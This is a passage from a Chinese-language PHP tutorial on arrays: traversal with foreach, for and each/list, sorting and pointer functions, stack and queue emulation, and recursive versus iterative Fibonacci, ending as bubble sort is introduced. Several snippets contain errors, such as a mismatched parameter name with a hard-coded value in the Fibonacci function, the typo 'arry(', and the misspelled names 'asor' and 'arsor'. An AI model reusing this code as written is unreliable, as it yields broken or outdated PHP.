[11]=&gt; string(1) &quot;2&quot; [3]=&gt; int(55) [&quot;key&quot;]=&gt; string(3) &quot;key&quot; &#125;</span></span><br></pre></td></tr></table></figure>


<h3 id="PHP数组特点"><a href="#PHP数组特点" class="headerlink" title="PHP数组特点"></a>PHP数组特点</h3><p>​    1、可以整数下标或者字符串下标</p>
<p>​        如果数组下标都为整数：索引数组</p>
<p>​        如果数组下标都为字符串：关联数组</p>
<p>​    2、不同下标可以混合存在：混合数组</p>
<p>​    3、数组元素的顺序以放入顺序为准，跟下标无关</p>
<p>​    4、数字下标的自增长特性：从0开始自动增长，如果中间手动出现较大的，那么后面的自增长元素从最大的值+1开始</p>
<p>​    5、特殊值下标的自动转换</p>
<p>​        布尔值：true和false</p>
<p>​        空：NULL</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr4</span>[<span class="literal">false</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$arr4</span>[<span class="literal">true</span>] = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$arr4</span>[<span class="literal">NULL</span>] = <span class="literal">NULL</span>;</span><br><span class="line">var_dump(<span class="variable">$arr4</span>);		<span class="comment">//array(3) &#123; [0]=&gt; bool(false) [1]=&gt; bool(true) [&quot;&quot;]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure>
<p>​    6、PHP中数组元素没有类型限制</p>
<p>​    7、PHP中数组元素没有长度限制</p>
<p>补充：PHP中的数组是很大的数据，所以存储是堆区，为当前数组分配一块连续的内存。</p>
<h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p>多维数组：数组里面的元素又是数组</p>
<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p>二维数组：数组中所有的元素都是一维数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Dim&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">28</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Lily&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">20</span>)		<span class="comment">//最后一个元素，后面可以跟逗号不影响（不建议）</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure>


<h4 id="多维数组-1"><a href="#多维数组-1" class="headerlink" title="多维数组"></a>多维数组</h4><p>在第二维的数组元素中可以继续时数组，在PHP中没有维度限制（PHP本质并没有二维数组）</p>
<p>但是：不建议使用超过三维以上的数组，会增加访问复杂度，降低访问效率。</p>
<h4 id="异形数组（不规则数组）"><a href="#异形数组（不规则数组）" class="headerlink" title="异形数组（不规则数组）"></a>异形数组（不规则数组）</h4><p>异形数组：数组中的元素不规则，有普通基本变量也有数组</p>
<p>在实际开发中，并不常用，尽量让数组袁术规则化（便于进行访问）</p>
<h3 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h3><h4 id="遍历的基本含义"><a href="#遍历的基本含义" class="headerlink" title="遍历的基本含义"></a>遍历的基本含义</h4><p>数组遍历：普通数组数据的访问都是通过数组元素的下标来实现访问，如果说数组中所有的数据都需要一次输出出来，就需要我们使用到一些简化的规则来实现自动获取下标以及输出数组元素。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = arry(<span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Tom&#x27;</span>),<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Jim&#x27;</span>));	<span class="comment">//二维数组</span></span><br><span class="line"><span class="comment">//访问一维元素：$arr[一维下标]</span></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>];		<span class="comment">//结果：array(&#x27;name&#x27; =&gt; &#x27;Tom&#x27;)</span></span><br><span class="line"><span class="comment">//访问二维元素：$arr[一维下标][二维下标]</span></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>][<span class="string">&#x27;name&#x27;</span>]；		<span class="comment">//Jim</span></span><br></pre></td></tr></table></figure>


<h4 id="foreach遍历语法"><a href="#foreach遍历语法" class="headerlink" title="foreach遍历语法"></a>foreach遍历语法</h4><p>基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($数组变量 <span class="keyword">as</span>[$下标 =&gt;]$值)&#123;</span><br><span class="line">    <span class="comment">//通过$下标访问元素的下标；通过$值访问元素的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通常：如果时关联数组（字母下标），就需要下标，如果是数字下标就直接访问值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PHP数组遍历：foreach</span></span><br><span class="line"><span class="comment">//定义数组</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//foreach循环</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="comment">//$v随意命名</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//1,2,3,4,5,6,7,8,9,10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="comment">//$v随意命名</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;key:&#x27;</span>,<span class="variable">$k</span>,<span class="string">&#x27; == value:&#x27;</span>,<span class="variable">$v</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//key:0 == value:1</span></span><br><span class="line">												<span class="comment">//key:1 == value:2</span></span><br><span class="line">												<span class="comment">//key:2 == value:3</span></span><br><span class="line">												<span class="comment">//key:3 == value:4</span></span><br><span class="line">												<span class="comment">//key:4 == value:5</span></span><br><span class="line">												<span class="comment">//key:5 == value:6</span></span><br><span class="line">												<span class="comment">//key:6 == value:7</span></span><br><span class="line">												<span class="comment">//key:7 == value:8</span></span><br><span class="line">												<span class="comment">//key:8 == value:9</span></span><br><span class="line">												<span class="comment">//key:9 == value:10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在进行数据存储定义的时候，通常二维数组不会两个维度的key下标都为数字，一般时一维为数字（无意义），二维为字符串（数据库表字段），所以在进行遍历的时候，通常是只需要针对一维进行遍历，取得二维数组元素，然后二维数组元素通过下标去访问。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Dim&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>),</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">28</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">//通过foreach遍历一维元素</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="comment">//1、可以继续遍历：增加foreach遍历$value</span></span><br><span class="line">    <span class="comment">//2、可以使用下标访问</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;name is:&#x27;</span>,<span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27; and age is:&#x27;</span>,<span class="variable">$value</span>[<span class="string">&#x27;age&#x27;</span>],<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;			<span class="comment">//name is:Dim and age is:30</span></span><br><span class="line">		<span class="comment">//name is:Tom and age is:28</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="foreach遍历原理"><a href="#foreach遍历原理" class="headerlink" title="foreach遍历原理"></a>foreach遍历原理</h4><p>foreach遍历的原理：本质时数组的内部有一颗指针，默认时指向数组元素的第一个元素，foreach就是利用指针去获取数据，同时移动指针。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">	<span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    1、foreach会重置指针：让指针指向第一个元素；</p>
<p>​    2、进入foreach循环：通过指针取得当前第一个元素，然后将下标取出放到对应的下标变量$k中（如果存在），将值取出来放到对应的值变量$v中；（指针下移）    </p>
<p>​    3、进入到循环内部（循环体），开始执行；</p>
<p>​    4、重复2和3，直到在2的时候遇到指针取不到内容（指针指向数组最后）</p>
<h4 id="for循环遍历数组"><a href="#for循环遍历数组" class="headerlink" title="for循环遍历数组"></a>for循环遍历数组</h4><p>for循环：基于已知边界条件（起始和结束）然后有条件的变化（规律）</p>
<p>因此：for循环遍历数组有对应条件</p>
<p>​    1、获取数组长度：count(数组)的阿斗数组元素的长度</p>
<p>​    2、要求数组元素的下标时规律的数字</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组特点：索引数组，下标规律</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>,<span class="variable">$len</span> = count(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;key is:&#x27;</span>,<span class="variable">$i</span>,<span class="string">&#x27; and value is:&#x27;</span>,<span class="variable">$arr</span>[<span class="variable">$i</span>],<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    			<span class="comment">//key is:0 and value is:1</span></span><br><span class="line">				<span class="comment">//key is:1 and value is:2</span></span><br><span class="line">				<span class="comment">//key is:2 and value is:3</span></span><br><span class="line">				<span class="comment">//key is:3 and value is:4</span></span><br><span class="line">				<span class="comment">//key is:4 and value is:5</span></span><br><span class="line">				<span class="comment">//key is:5 and value is:6</span></span><br><span class="line">				<span class="comment">//key is:6 and value is:7</span></span><br><span class="line">				<span class="comment">//key is:7 and value is:10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="while配合each和list遍历数组"><a href="#while配合each和list遍历数组" class="headerlink" title="while配合each和list遍历数组"></a>while配合each和list遍历数组</h4><p>while实在外部定义边界条件，如果要实现可以和for循环实现</p>
<p>each函数使用：each能够从一个数组中获取当前数组指针所指向的元素的下标和值，拿到之后将数组指针下移，同时将拿到的元素的下标和值以一个四个元素的数组返回：</p>
<p>​    0下标 –&gt; 取得元素的下标值</p>
<p>​    1下标 –&gt; 取得元素的值</p>
<p>​    key下标 –&gt; 取得元素的下标值</p>
<p>​    value下标 –&gt; 取得元素的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Tom&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre/&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//each函数指针操作</span></span><br><span class="line">print_r(each(<span class="variable">$arr</span>));	<span class="comment">//Array([1] =&gt; 1 [value] =&gt; 1 [0] =&gt; 0 [key] =&gt; 0)</span></span><br><span class="line">print_r(each(<span class="variable">$arr</span>));	<span class="comment">//Array( [1] =&gt; Tom [value] =&gt; Tom [0] =&gt; name [key] =&gt; name)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果each取不到结果（数组指针移到最后），返回false</p>
<p>list函数使用：list是一种结构，不是一种函数（没有返回值），是list提供一堆变量去从一个数组中取得元素值，然后依次存放到对应的变量当中（批量为变量赋值：值来源于数组）：list必须从索引数组中去获取数据，而且必须从0开始。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span> =&gt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$first</span>) = <span class="variable">$arr</span>;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$first</span>,<span class="variable">$second</span>) = <span class="variable">$arr</span>;	<span class="comment">//错误：second变量对应的小标为元素小标1的，但是数组没有</span></span><br><span class="line">var_dump(<span class="variable">$first</span>);		<span class="comment">//int(1)</span></span><br></pre></td></tr></table></figure>
<p>list和each配合特别好：each一定有两个元素就是0和1下标元素</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">list</span>(变量<span class="number">1</span>,变量<span class="number">2</span>) = each(数组);	<span class="comment">//是一种赋值运算，但是可以得到false结果（each取不到正确的结果），整个表达式为false</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Tom&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">list</span>(<span class="variable">$key</span>,<span class="variable">$value</span>) = each(<span class="variable">$arr</span>))&#123;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;key is :&#x27;</span>,<span class="variable">$key</span>,<span class="string">&#x27; value is:&#x27;</span>,<span class="variable">$value</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="数组的相关函数"><a href="#数组的相关函数" class="headerlink" title="数组的相关函数"></a>数组的相关函数</h3><p>​    1、排序函数：对数组元素进行排序，都是按照ASCII码进行比较，可以进行英文比较</p>
<p>​        sort()：顺序排序（下标重排）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//排序函数</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$sort_arr</span> = sort(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ([0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 5 )</span></span><br></pre></td></tr></table></figure>
<p>​        rsort()：逆向排序（下标重排）</p>
<p>​        asor()：顺序排序（下标保留）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$asort_arr</span> = asort(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [4] =&gt; 0 [1] =&gt; 1 [3] =&gt; 2 [0] =&gt; 3 [2] =&gt; 5 )</span></span><br></pre></td></tr></table></figure>
<p>​        arsor()：逆序排序（下标保留）</p>
<p>​        ksort()：顺序排序：按照键名（下标）</p>
<p>​        krsort()：逆序排序：按照键名（下标）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$krsort_arr</span> = krsort(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [4] =&gt; 0 [3] =&gt; 2 [2] =&gt; 5 [1] =&gt; 1 [0] =&gt; 3 )</span></span><br></pre></td></tr></table></figure>
<p>​        shuffle()：随机打乱数组元素</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_arr</span> = sort(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$shuffle_arr</span> = shuffle(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [0] =&gt; 3 [1] =&gt; 2 [2] =&gt; 0 [3] =&gt; 5 [4] =&gt; 1 )</span></span><br></pre></td></tr></table></figure>
<p>​    2、指针函数</p>
<p>​        reset()：重置指针，将数组指针回到首位</p>
<p>​        end()：重置指针，将数组指针指到最后一个元素</p>
<p>​        next()：指针下移，取得下一个元素的值</p>
<p>​        prev()：指针上移，取得上一个元素的值</p>
<p>​        current()：获得当前指针的元素值</p>
<p>​        key()：获得当前指针的下标值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//指针函数</span></span><br><span class="line"><span class="keyword">echo</span> key(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;			<span class="comment">//0</span></span><br><span class="line"><span class="keyword">echo</span> current(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//3</span></span><br><span class="line"><span class="keyword">echo</span> next(<span class="variable">$arr</span>),next(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//1,5</span></span><br><span class="line"><span class="keyword">echo</span> prev(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> end(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;			<span class="comment">//0</span></span><br><span class="line"><span class="keyword">echo</span> reset(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//3</span></span><br></pre></td></tr></table></figure>
<p>注意事项：next和prev会移动指针，有可能会导致指针移动到最前或者最后（离开数组），导致数组不能使用，通过next和prev不能回到正确的位置。只能通过end或者reset进行指针重置。</p>
<p>​    3、其他函数</p>
<p>​        count()：统计数组中元素的数量</p>
<p>​        array_push()：往数组中加入一个元素（数组后面）</p>
<p>​        array_pop()：从数组中取出一个元素（数组后面）</p>
<p>​        array_shift()：从数组中取出一个元素（数组前面）</p>
<p>​        array_unshift()：往数组中加入一个元素（数组前面）</p>
<p>​            PHP模拟数据结构：</p>
<p>​                栈：压栈，先进去后出来（FILO）</p>
<p>​                队列：排队，先进去的先出去（FIFO）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//栈：先压栈后出栈：都是从一端出来</span></span><br><span class="line"><span class="comment">//前面：array_shift/array_unshift</span></span><br><span class="line"><span class="comment">//后面：array_push/array_pop</span></span><br><span class="line"><span class="comment">//压栈</span></span><br><span class="line">array_push(<span class="variable">$arr</span>,<span class="number">3</span>);</span><br><span class="line">array_push(<span class="variable">$arr</span>,<span class="number">2</span>);</span><br><span class="line">array_push(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [0] =&gt; 3 [1] =&gt; 2 [2] =&gt; 1 )</span></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="keyword">echo</span> array_pop(<span class="variable">$arr</span>),array_pop(<span class="variable">$arr</span>),array_pop(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//1,2,3</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//队列：先排队，先出来，一端进，另外一端出</span></span><br><span class="line"><span class="comment">//后进前出：array_push/array_shfit</span></span><br><span class="line"><span class="comment">//前进后出：array_unshift/array_pop</span></span><br><span class="line"><span class="comment">//入队</span></span><br><span class="line">array_unshift(<span class="variable">$arr</span>,<span class="number">3</span>);</span><br><span class="line">array_unshift(<span class="variable">$arr</span>,<span class="number">2</span>);</span><br><span class="line">array_unshift(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);			<span class="comment">//Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 )</span></span><br><span class="line"><span class="comment">//出队</span></span><br><span class="line"><span class="keyword">echo</span> array_pop(<span class="variable">$arr</span>),array_pop(<span class="variable">$arr</span>),array_pop(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//3,2,1</span></span><br></pre></td></tr></table></figure>
<p>​        array_reverse()：把数组元素反过来</p>
<p>​        in_array()：判断一个元素在数组中是否存在</p>
<p>​        array_keys()：获取一个数组的所有下标，返回一个索引数组</p>
<p>​        array_values()：获取一个数组的所有值，返回一个索引数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">print_r(array_reverse(<span class="variable">$arr</span>));	<span class="comment">//Array ( [0] =&gt; 5 [1] =&gt; 4 [2] =&gt; 3 [3] =&gt; 2 [4] =&gt; 1 )</span></span><br><span class="line">var_dump(in_array(<span class="number">4</span>,<span class="variable">$arr</span>));		<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(in_array(<span class="number">8</span>,<span class="variable">$arr</span>));		<span class="comment">//bool(false)</span></span><br><span class="line">print_r(array_keys(<span class="variable">$arr</span>));		<span class="comment">//Array ( [0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 4 )</span></span><br><span class="line">print_r(array_values(<span class="variable">$arr</span>));	<span class="comment">//Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 )</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用指针遍历数组</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">while</span>(key(<span class="variable">$arr</span>)!==<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> key(<span class="variable">$arr</span>).<span class="string">&quot;=&gt;&quot;</span>.current(<span class="variable">$arr</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    next(<span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="编程思想"><a href="#编程思想" class="headerlink" title="编程思想"></a>编程思想</h2><p>编程思想：如何利用数学模式来解决对应的需求问题；然后利用代码实现对应的数据模型（逻辑）。</p>
<p>算法：使用代码实现对应的数学模型，从而解决对应的业务问题。</p>
<h3 id="递推算法"><a href="#递推算法" class="headerlink" title="递推算法"></a>递推算法</h3><p>递推算法是一种简单的算法，即通过已知条件，利用特定关系得出中间推论，直至得到结果的算法。递推算法分为顺推和逆推两种。</p>
<p>顺推：通过最简单的条件（已知），然后逐步推演结果</p>
<p>逆推：通过结果找到规律，然后推到已知条件</p>
<p>​    斐波那契数列：1  1  2  3  5  8  13 …，通常需求：请求得指定位置N所对应的值是多少</p>
<p>​        找规律：</p>
<p>​            1、第一个数是1</p>
<p>​            2、第二个数也是1</p>
<p>​            3、从第三位开始：属于前两个数的和</p>
<p>​        代码解决思路：</p>
<p>​            1、如果数字位置为1和2，结果都是1</p>
<p>​            2、从第三个开始，想办法得到前两个结果，就可以得到</p>
<p>​        终极解决办法：想办法要求的位置之前的所有的值都列出来，那么要求的数就可以通过前两个数之和计算出来：使用数组存储所有结果即可。</p>
<p>递推算法求斐波那契序列：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求：规律1  1  2  3  5...</span></span><br><span class="line"><span class="comment">//求出指定位数对应的值</span></span><br><span class="line"><span class="comment">//已知条件：第一个和第二个数都为1，第三个开始为前两个之和</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_recursive</span>(<span class="params"><span class="variable">$dse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$des</span> == <span class="number">1</span> || <span class="variable">$des</span> == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//开始计算</span></span><br><span class="line">	<span class="variable">$f</span>[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="variable">$f</span>[<span class="number">2</span>] = <span class="number">1</span>;		<span class="comment">//如果想要第一个或者第二个结果，那么可以直接给出</span></span><br><span class="line">	<span class="variable">$des</span> = <span class="number">15</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">3</span>;<span class="variable">$i</span> &lt;= <span class="variable">$des</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    	<span class="variable">$f</span>[<span class="variable">$i</span>] = <span class="variable">$f</span>[<span class="variable">$i</span><span class="number">-1</span>] + <span class="variable">$f</span>[<span class="variable">$i</span><span class="number">-2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//查看</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$f</span>[<span class="variable">$des</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> my_recursive(<span class="number">15</span>);		<span class="comment">//610</span></span><br></pre></td></tr></table></figure>


<h3 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h3><p>递推算法是把问题转化为规模小了的同类问题的子问题。然后递归调用函数（或过程）来表示问题的解。</p>
<p>​    1、简化问题：找到最优子问题（不能再小）</p>
<p>​    2、函数自己调用自己</p>
<p>斐波那契数列：1  1  2  3  5  8  13 …</p>
<p>​    需求：请求得指定位置N所对应的值是多少</p>
<p>​    规律：第一和第二个数为1，从第三个开始为前两个数之和</p>
<p>​        F(N) = F(N-1) + F(N-2);</p>
<p>​        F(N-1) = F(N-2) + F(N-3);</p>
<p>​        …</p>
<p>​        F(2) = F(1) = 1;</p>
<p>递归思想中：量两个非常重要的点</p>
<p>​    递归点：发现当前问题又解决当前问题的函数，取解决规模比当前小一点的问题来解决F(N) = F(N-1) + F(N-2)</p>
<p>​    递归出口：当问题解决的时候，已经到达（必须有）最优子问题，不能再次调用函数</p>
<p>​        如果一个函数递归调用自己而没有递归出口：就是死循环</p>
<p>递归的本质是函数调用函数：一个函数需要开辟一块内存空间，递归会出现同时调用N多个函数（自己）：递归的本质是利用空间换时间。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归一定有函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursion</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//递归出口</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span> == <span class="number">1</span> || <span class="variable">$n</span> == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//递归点：求N的值，与求N-1的值一模一样，只是N-1的规模比N小</span></span><br><span class="line">    <span class="keyword">return</span> recursion(<span class="variable">$n</span><span class="number">-1</span>) + recursion(<span class="variable">$n</span><span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> recursion(<span class="number">15</span>);		<span class="comment">//610</span></span><br></pre></td></tr></table></figure>


<h3 id="数组排序算法"><a href="#数组排序算法" class="headerlink" title="数组排序算法"></a>数组排序算法</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>冒泡排序（bubble sort），是一种计算机科学领域的比较简单的排序算法。</p>
<p>他重复地走访过要排序的序列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。</p>
<p>走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。</p>
